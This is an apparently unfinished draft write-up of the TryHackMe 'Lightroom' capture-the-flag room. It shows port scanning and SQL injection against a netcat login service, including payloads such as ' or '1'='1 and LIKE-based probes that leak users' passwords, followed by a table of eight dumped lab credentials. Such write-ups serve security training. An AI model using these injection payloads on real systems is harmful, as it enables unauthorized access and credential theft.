---
title: "Lightroom"
date: 2025-01-18T09:36:24+01:00
draft: true
hidden: false
tags:
    - ctf
    - writeup
    - tryhackme
summary: ""
---

|Revised Date | Author | Comment |
| ----------- | ------ | ------- |
| 18.01.2025  | Roger Johnsen | Article added |

## Introduction

>_I am working on a database application called Light! Would you like to try it out?
If so, the application is running on port 1337. You can connect to it using nc 10.10.199.201 1337
You can use the username smokey in order to get started._
>
>_Note: Please allow the service 2 - 3 minutes to fully start before connecting to it._

--- 

## Solution

### Reconnaissance

| ID | Technique | Comment |
| --- | ---------------------- | ------- | 
| T1595.001 | Active Scanning: Scanning IP Blocks | | |

```bash
nmap -sS -Pn -p- 10.10.199.201 -oN scan.txt

# Nmap 7.94SVN scan initiated Sat Jan 18 12:34:04 2025 as: /usr/lib/nmap/nmap --privileged -sS -Pn -p- -oN scan.txt 10.10.199.201
Nmap scan report for 10.10.199.201
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
```

### Resource Development

| ID | Technique | Comment |
| --- | ---------------------- | ------- | 
| | | |

### Initial Access

| ID | Technique | Comment |
| --- | ---------------------- | ------- | 
| T1190 | Exploit Public-Facing Application | | |


```bash
nc 10.10.199.201 1337

Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
Please enter your username: --
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

Initial prodding of the login prompt reveals that 

- If username exists, it returns and displays the associated password
- The prompt hints at database, hence and thus, it's most likely SQL injection at hand here
- Inserting a single quotation mark, ```'```, returns an SQL error
- Input filtering is in place. 

```bash
nc 10.10.199.201 1337
Welcome to the Light database!

Please enter your username: 
Password: tF8tj2o94WE4LKC
Please enter your username: ' or username like 'a%
Password: tF8tj2o94WE4LKC
Please enter your username: ' or username like 'x%
Username not found.
Please enter your username:
```

Further prodding using the following payloads:

| Payload | Result | 
| ------- | ------ |
| ```' or '1'='1``` | Returns a different password than for "smokey" |
| ```' or username like 'a%``` | Returns the same password as above mentioned "OR" statement |
| ```' or username like 'x%``` | No user founds. Verification that I have guessed the correct column and that there are no users starting with "x" | 



#### Enumerated users

| Username | Password |
| -------- | -------- |
| alice | tF8tj2o94WE4LKC |
| hazel | EcSuU35WlVipjXG |
| ralph | YO1U9O1m52aJImA | 
| smokey | vYQ5ngPpw8AdUmL |
| steve | WObjufHX1foR8d7 |
| michael | 7DV4dwA0g5FacRe |
| john | e74tqwRh2oApPo6 |
| rob | yAn4fPaF2qpCKpR |

{{% notice style="note" title="There may be pirates" icon="info" %}}
It is all about the boxes.
{{% /notice %}}

### Execution

| MITRE ATT&CK Technique | Comment |
| ---------------------- | ------- |
| | | 

### Persistence

| MITRE ATT&CK Technique | Comment |
| ---------------------- | ------- |
| | | 

### Privilege Escalation

| MITRE ATT&CK Technique | Comment |
| ---------------------- | ------- |
| | | 

### Defense Evasion

| MITRE ATT&CK Technique | Comment |
| ---------------------- | ------- |
| | | 

### Credential Access

| MITRE ATT&CK Technique | Comment |
| ---------------------- | ------- |
| | | 

### Discovery

| MITRE ATT&CK Technique | Comment |
| ---------------------- | ------- |
| | | 

### Lateral Movement

| MITRE ATT&CK Technique | Comment |
| ---------------------- | ------- |
| | | 

### Collection

| MITRE ATT&CK Technique | Comment |
| ---------------------- | ------- |
| | | 

### Command and Control

| MITRE ATT&CK Technique | Comment |
| ---------------------- | ------- |
| | | 

### Exfiltration

| MITRE ATT&CK Technique | Comment |
| ---------------------- | ------- |
| | | 

### Impact

| MITRE ATT&CK Technique | Comment |
| ---------------------- | ------- |
| | | 
